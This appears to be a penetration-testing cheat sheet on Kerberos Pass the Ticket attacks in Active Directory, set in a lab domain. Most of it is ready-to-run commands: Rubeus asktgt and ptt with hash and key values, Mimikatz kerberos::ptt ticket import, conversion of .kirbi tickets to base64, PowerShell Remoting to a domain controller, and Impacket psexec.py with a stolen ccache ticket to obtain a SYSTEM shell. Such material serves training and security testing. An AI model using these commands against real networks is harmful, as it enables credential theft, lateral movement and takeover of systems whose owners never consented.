# Pass the Ticket (PtT) 
- https://lisandre.com/archives/14885
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket
Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

## Rubeus Pass the Ticket
```
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
```

Note that now it displays Ticket successfully imported!.

Another way is to import the ticket into the current session using the .kirbi file from the disk.

Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

## Rubeus - Pass the Ticket using kirbi 
```
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

### Convert .kirbi to Base64 Format
```
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

#### Pass the Ticket - Base64 Format
```
> Rubeus.exe ptt /ticket: <Ticket>
```

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

## Mimikatz - Pass the Ticket using kirbi
```
> mimikatz.exe 
> privilege::debug
> kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
> exit
```

`Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.`

## Pass The Ticket with PowerShell Remoting 
To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

### Mimikatz - PowerShell Remoting with Pass the Ticket
```
> mimikatz.exe
> privilege::debug
> kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
> exit
> powershell
```

### Rubeus - PowerShell Remoting with Pass the Ticket
#### Create a Sacrificial Process with Rubeus
```
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.

#### Rubeus - Pass the Ticket for Lateral Movement
```
> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
> powershell
> Enter-PSSession -ComputerName DC01
```

## Getting a SYSTEM shell using Impacket
With ccache file obtained Passing the Key or Overpassing the Hash, to execute impacket tools, the ccache file needs to be exported to  environment variable.
```
$ ticketConverter.py <kirbi||ccache> <kirbi||ccache>
$ export KRB5CCNAME=<path_to_ticket>.ccache
$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5


# Same as PassTheHash but use -k and -no-pass 
$ psexec.py -dc-ip IP -target-ip $IP -no-pass -k <DOMAIN>/<USER>@<target machine name>.<DOMAIN> -> goat
$ psexec.py -dc-ip <IP> -no-pass -k <domain>/<user>:@<ip>
```